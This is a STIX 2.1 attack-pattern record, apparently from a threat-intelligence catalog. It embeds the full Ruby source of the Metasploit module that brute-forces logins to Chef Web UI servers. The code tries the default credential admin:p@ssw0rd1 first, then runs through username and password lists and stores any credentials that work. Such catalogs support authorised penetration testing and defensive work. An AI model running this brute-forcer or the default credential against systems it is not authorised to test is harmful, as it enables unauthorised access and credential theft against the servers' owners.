{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--08dccabe-0868-410e-aeaa-e04b0b5dd1df",
    "created": "2024-08-14T16:30:41.751194Z",
    "modified": "2024-08-14T16:30:41.751198Z",
    "name": "Chef Web UI Brute Force Utility",
    "description": " This module attempts to login to Chef Web UI server instance using username and password combinations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options. It will also test for the default login (admin:p@ssw0rd1). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/chef_webui_login.rb",
            "external_id": "chef_webui_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/login_scanner/chef_webui'\nrequire 'metasploit/framework/credential_collection'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'Chef Web UI Brute Force Utility',\n      'Description'    => %q{\n        This module attempts to login to Chef Web UI server instance using username and password\n        combinations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options. It\n        will also test for the default login (admin:p@ssw0rd1).\n      },\n      'Author'         =>\n        [\n          'hdm'\n        ],\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' =>\n      {\n        'SSL'         => true,\n      }\n    )\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('USERNAME', [false, 'The username to specify for authentication', '']),\n        OptString.new('PASSWORD', [false, 'The password to specify for authentication', '']),\n        OptString.new('TARGETURI', [ true,  'The path to the Chef Web UI application', '/']),\n      ])\n\n    deregister_options('PASSWORD_SPRAY')\n  end\n\n  #\n  # main\n  #\n  def run_host(ip)\n    init_loginscanner(ip)\n    msg = @scanner.check_setup\n    if msg\n      print_brute :level => :error, :ip => rhost, :msg => msg\n      return\n    end\n\n    print_brute :level=>:status, :ip=>rhost, :msg=>(\"Found Chef Web UI application at #{datastore['TARGETURI']}\")\n    bruteforce(ip)\n  end\n\n  def bruteforce(ip)\n    @scanner.scan! do |result|\n      case result.status\n        when Metasploit::Model::Login::Status::SUCCESSFUL\n          print_brute :level => :good, :ip => ip, :msg => \"Success: '#{result.credential}'\"\n          do_report(ip, rport, result)\n          :next_user\n        when Metasploit::Model::Login::Status::DENIED_ACCESS\n          print_brute :level => :status, :ip => ip, :msg => \"Correct credentials, but unable to login: '#{result.credential}'\"\n          do_report(ip, rport, result)\n          :next_user\n        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n          if datastore['VERBOSE']\n            print_brute :level => :verror, :ip => ip, :msg => \"Could not connect\"\n          end\n          invalidate_login(\n            address: ip,\n            port: rport,\n            protocol: 'tcp',\n            public: result.credential.public,\n            private: result.credential.private,\n            realm_key: result.credential.realm_key,\n            realm_value: result.credential.realm,\n            status: result.status\n          )\n          :abort\n        when Metasploit::Model::Login::Status::INCORRECT\n          if datastore['VERBOSE']\n            print_brute :level => :verror, :ip => ip, :msg => \"Failed: '#{result.credential}'\"\n          end\n          invalidate_login(\n            address: ip,\n            port: rport,\n            protocol: 'tcp',\n            public: result.credential.public,\n            private: result.credential.private,\n            realm_key: result.credential.realm_key,\n            realm_value: result.credential.realm,\n            status: result.status\n          )\n      end\n    end\n  end\n\n  def do_report(ip, port, result)\n    service_data = {\n      address: ip,\n      port: port,\n      service_name: 'http',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: self.fullname,\n      origin_type: :service,\n      private_data: result.credential.private,\n      private_type: :password,\n      username: result.credential.public,\n    }.merge(service_data)\n\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n      core: credential_core,\n      last_attempted_at: DateTime.now,\n      status: result.status\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def init_loginscanner(ip)\n    @cred_collection = build_credential_collection(\n      username: datastore['USERNAME'],\n      password: datastore['PASSWORD']\n    )\n\n    # Always try the default first\n    @cred_collection.prepend_cred(\n      Metasploit::Framework::Credential.new(public: 'admin', private: 'p@ssw0rd1')\n    )\n\n    @scanner = Metasploit::Framework::LoginScanner::ChefWebUI.new(\n      configure_http_login_scanner(\n        uri:                datastore['TARGETURI'],\n        cred_details:       @cred_collection,\n        stop_on_success:    datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n        connection_timeout: 5,\n        http_username: datastore['HttpUsername'],\n        http_password: datastore['HttpPassword']\n      )\n    )\n  end\nend\n"
}